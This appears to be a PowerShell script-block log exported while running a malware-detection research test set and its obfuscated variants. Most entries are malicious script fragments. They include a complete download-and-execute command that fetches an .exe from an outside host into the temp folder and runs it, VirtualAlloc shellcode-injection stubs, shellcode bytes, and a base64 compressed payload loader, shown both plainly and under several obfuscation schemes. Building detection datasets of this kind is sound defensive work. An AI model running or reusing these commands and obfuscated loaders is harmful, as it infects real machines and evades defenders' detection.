"8/6/2026 9:46:31 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1178.ps1","2933"," (((""{49}{6}{45}{21}{1}{36}{52}{32}{8}{34}{12}{33}{22}{28}{3}{56}{47}{39}{17}{69}{25}{50}{11}{4}{41}{40}{35}{10}{38}{55}{60}{16}{64}{63}{18}{67}{24}{26}{2}{46}{0}{15}{66}{42}{54}{37}{7}{48}{53}{31}{51"
"8/6/2026 9:46:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:46:23 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:46:23 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:46:23 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:46:23 AM","","2244","$eVT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:46:23 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1178.ps1","2576","invokE-EXPREsSioN( (('YQmeVT = 4XM[DllImport(ldokernel32.dllldo)]public'+' static extern IntPtr VirtualAlloc(IntPtr lpAddress, uin'+'t dwSize, uint flAllocationT'+'ype, uint flProtect);[DllImport('+'l"
"8/6/2026 9:46:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:46:15 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:46:15 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:46:15 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:46:15 AM","","2244","$eVT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:46:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1178.ps1","24","{( [int] $_ -as [cHar])}"
"8/6/2026 9:46:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1178.ps1","7644"," [stRinG]::jOIN('',('36,101k86W84X32k61s32c39B91d68c108d108B73X109s112X111W114!116d40!34s107!101I114c110k101,108d51d50,46I100k108W108s34,41k93X112!117c98!108!105!99!32s115k116c97d116W105B99X32s101d120"
"8/6/2026 9:46:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:46:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:46:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:46:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:46:07 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1178.ps1","2244","$eVT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:46:00 AM","","9","$global:?"
"8/6/2026 9:45:59 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:45:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:45:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:45:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:45:59 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1173.ps1","149","(NEw`-`objeCT System.Net.WebClient).DownloadFile('http://nikil.tk/k1/ik_001.exe',""$env:TEMP\ik_001.exe"");sT`ARt`-prO`CE`sS (""$env:TEMP\ik_001.exe"")
"
"8/6/2026 9:45:52 AM","","9","$global:?"
"8/6/2026 9:45:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:45:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:45:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:45:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:45:52 AM","","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/k1/ik_001.exe',""$env:TEMP\ik_001.exe"");Start-Process (""$env:TEMP\ik_001.exe"")"
"8/6/2026 9:45:51 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1173.ps1","558"," & ( $ShelLiD[1]+$SheLLid[13]+'X') ( (((""{14}{4}{6}{20}{17}{18}{0}{1}{10}{19}{21}{5}{7}{9}{13}{25}{12}{23}{24}{22}{15}{26}{11}{27}{3}{2}{28}{29}{8}{16}""-f'lient)','.Downlo',' (Zs','rt-Process','ject S"
"8/6/2026 9:45:44 AM","","9","$global:?"
"8/6/2026 9:45:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:45:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:45:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:45:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:45:44 AM","","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/k1/ik_001.exe',""$env:TEMP\ik_001.exe"");Start-Process (""$env:TEMP\ik_001.exe"")"
"8/6/2026 9:45:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1173.ps1","513",". ( ([stRInG]$verbOSeprEFeREnCe)[1,3]+'x'-joIn'')( ('(New-Objec'+'t'+' S'+'ystem.Net'+'.'+'WebC'+'lien'+'t'+').DownloadFile(T'+'uRhttp:/'+'/n'+'i'+'kil.tk/k1'+'/'+'ik_001'+'.exe'+'T'+'uR,sf'+'g1Hq'+'e"
"8/6/2026 9:45:36 AM","","9","$global:?"
"8/6/2026 9:45:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:45:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:45:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:45:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:45:36 AM","","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/k1/ik_001.exe',""$env:TEMP\ik_001.exe"");Start-Process (""$env:TEMP\ik_001.exe"")"
"8/6/2026 9:45:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1173.ps1","24","{( [int] $_ -AS [ChaR])}"
"8/6/2026 9:45:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1173.ps1","699"," . ( $enV:ComSPEc[4,24,25]-jOin'')( [sTriNG]::joIn( '' ,('40_78_101o119o45_79s98_106s101:99k116z32_83k121:115k116:101J109!46C78k101o116_46!87k101k98:67_108:105o101s110z116<41C46!68s111z119J110k108s111"
"8/6/2026 9:45:29 AM","","9","$global:?"
"8/6/2026 9:45:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:45:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:45:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:45:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:45:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1173.ps1","141","(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/k1/ik_001.exe',""$env:TEMP\ik_001.exe"");Start-Process (""$env:TEMP\ik_001.exe"")"
"8/6/2026 9:45:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:45:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:45:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:45:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:45:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1154.ps1","2192","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:45:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:45:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:45:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:45:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:45:12 AM","","2186","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:45:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1154.ps1","2731"," (((""{37}{38}{39}{16}{21}{17}{36}{27}{33}{32}{34}{1}{13}{8}{3}{0}{44}{25}{15}{7}{12}{30}{22}{43}{26}{18}{45}{11}{9}{29}{41}{10}{2}{40}{42}{6}{24}{14}{5}{35}{28}{20}{4}{31}{19}{23}"" -f 'xff,0xac,0xc1,0"
"8/6/2026 9:45:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:45:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:45:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:45:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:45:04 AM","","2186","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:45:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1154.ps1","2551"," & ( $shElLiD[1]+$ShElLiD[13]+'x')( (('9u2c '+'='+' NU2[DllImport(PgAker'+'nel32.dllPgA)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"
"8/6/2026 9:44:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:44:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:44:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:44:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:44:56 AM","","2187","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:44:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1154.ps1","18","{([chaR][InT] $_)}"
"8/6/2026 9:44:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1154.ps1","7555"," ""$( SEt-ITem  'vaRiAblE:OFS' '')""+[sTriNG]('36S99S32S61S32}39M91F68M108h108~73F109%112M111;114Y116%40M34S107r101~114r110;101}108;51S50;46;100S108%108%34h41Y93F112}117h98;108;105;99%32~115Y116h97;116S"
"8/6/2026 9:44:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:44:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:44:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:44:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:44:48 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1154.ps1","2186","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:44:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:44:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:44:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:44:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:44:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1148.ps1","2703","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:44:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:44:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:44:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:44:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:44:32 AM","","2696","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:44:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1148.ps1","3476"," (((""{53}{41}{25}{38}{54}{11}{61}{19}{57}{9}{4}{50}{64}{45}{75}{22}{26}{74}{15}{34}{66}{77}{39}{29}{24}{6}{7}{47}{79}{18}{71}{1}{0}{60}{32}{81}{42}{35}{10}{70}{46}{2}{83}{67}{65}{69}{37}{13}{48}{58}{6"
"8/6/2026 9:44:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:44:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:44:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:44:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:44:24 AM","","2696","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:44:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1148.ps1","3195","&( $PsHOme[21]+$PsHOmE[30]+'X')( ('6r7c = upG[DllImport(wyKkernel32.dllwyK)]public static extern IntPtr VirtualAlloc('+'Int'+'Ptr lpAddress, '+'uint dwSize, uint flAllocationType, uint flProtect);[Dl'"
"8/6/2026 9:44:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:44:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:44:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:44:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:44:16 AM","","2696","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:44:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1148.ps1","23","{ ([INT] $_-As [cHAr])}"
"8/6/2026 9:44:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1148.ps1","11763","-JoiN ( (36,99, 32, 61, 32 ,39 , 91 , 68,108,108 ,73, 109 ,112 ,111 ,114 ,116 , 40,34, 107, 101 , 114, 110,101 , 108 , 51, 50, 46 ,100, 108, 108 ,34, 41, 93 ,112 ,117, 98 , 108 ,105, 99 , 32, 115 ,116"
"8/6/2026 9:44:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:44:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:44:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:44:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:44:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1148.ps1","2696","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:44:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:44:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:44:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:44:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:44:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1144.ps1","2251","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:43:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:43:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:43:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:43:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:43:53 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:43:53 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1144.ps1","2753"," .( $env:cOMspEc[4,24,25]-jOIN'')( (((""{18}{41}{42}{43}{23}{38}{27}{9}{10}{45}{26}{20}{44}{2}{25}{39}{35}{24}{14}{4}{40}{37}{8}{11}{15}{7}{34}{5}{3}{30}{32}{29}{36}{19}{21}{22}{17}{13}{16}{31}{12}{46}"
"8/6/2026 9:43:45 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:43:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1144.ps1","2658"," (('R8gc = ENx[DllImport(Ugfkernel32.dllUgf)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,'+' uint flAllocationTy'+'pe, uint flProtect);[DllImport(Ugfkern'+'el32.dllUgf)]publ"
"8/6/2026 9:43:35 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:43:35 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:43:35 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:43:35 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:43:35 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:43:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1144.ps1","21","{( [cHar] [INT] $_) }"
"8/6/2026 9:43:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1144.ps1","7636","-join ('36Y99Y32t61t32m39m91m68t108N108m73_109t112m111p114p116I40t34~107_101a114>110I101m108>51I50Y46~100>108a108_34p41N93Y112Y117>98~108m105t99N32N115~116_97Y116p105m99N32Y101m120Y116N101p114~110N32~"
"8/6/2026 9:43:26 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:43:26 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:43:26 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:43:26 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:43:25 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1144.ps1","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:43:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:43:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:43:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:43:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:43:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1136.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:43:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:43:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:43:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:43:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:43:09 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:43:09 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1136.ps1","2919",".( $pShoME[4]+$PsHoMe[34]+'X')( (((""{58}{29}{53}{65}{13}{67}{18}{7}{1}{42}{19}{33}{2}{62}{68}{10}{41}{63}{16}{24}{55}{57}{48}{0}{51}{12}{8}{64}{15}{69}{32}{27}{37}{22}{25}{4}{28}{43}{9}{5}{49}{47}{40}"
"8/6/2026 9:43:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:43:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:43:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:43:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:43:02 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:43:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1136.ps1","2635"," INVOkE-exPReSsioN( ('PT8c = 57E[DllImport(tmdkernel32.dlltmd)]'+'public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, ui'+'nt '+'flProtect);[DllImport(tmdker"
"8/6/2026 9:42:55 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:42:55 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:42:55 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:42:55 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:42:55 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:42:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1136.ps1","20","{ ([ChAR] [iNT]$_) }"
"8/6/2026 9:42:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1136.ps1","7575"," &( $PshOme[4]+$PshOmE[30]+'x')(( '36D99D32%61m32;39%91X68l108<108X73_109<112D111%114D116C40D34%107D101C114l110_101D108A51;50%46C100<108_108%34l41C93A112%117D98l108A105;99m32;115;116m97%116l105A99l32m"
"8/6/2026 9:42:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:42:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:42:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:42:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:42:47 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1136.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:42:43 AM","","9","$global:?"
"8/6/2026 9:42:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:42:42 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:42:42 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:42:42 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:42:42 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 9:42:42 AM","","520","function jhZ8rZG8 {
	Param ($jb2R1cdw, $zwfVQ)		
	$mZKnRiCld = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll"
"8/6/2026 9:42:42 AM","","2696","function jhZ8rZG8 {
	Param ($jb2R1cdw, $zwfVQ)		
	$mZKnRiCld = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll"
"8/6/2026 9:42:41 AM","","1968","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAK09CVgCA7VWa2/iOhD93JX2P0QrJBItJUDZtltppesQngUKpIQCi67cxElMTUwdh9fe/e93wqOl2nbVu9KNWmFnZuzxOWc88eLQkZSHyjQYXYpR9VL58fHDSQcLPFPU1PS+0Ms7"
"8/6/2026 9:42:40 AM","","9","$global:?"
"8/6/2026 9:42:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1125.ps1","2338","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New`-oBj`ECt System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-no"
"8/6/2026 9:42:35 AM","","9","$global:?"
"8/6/2026 9:42:35 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:42:35 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:42:35 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:42:35 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:42:35 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
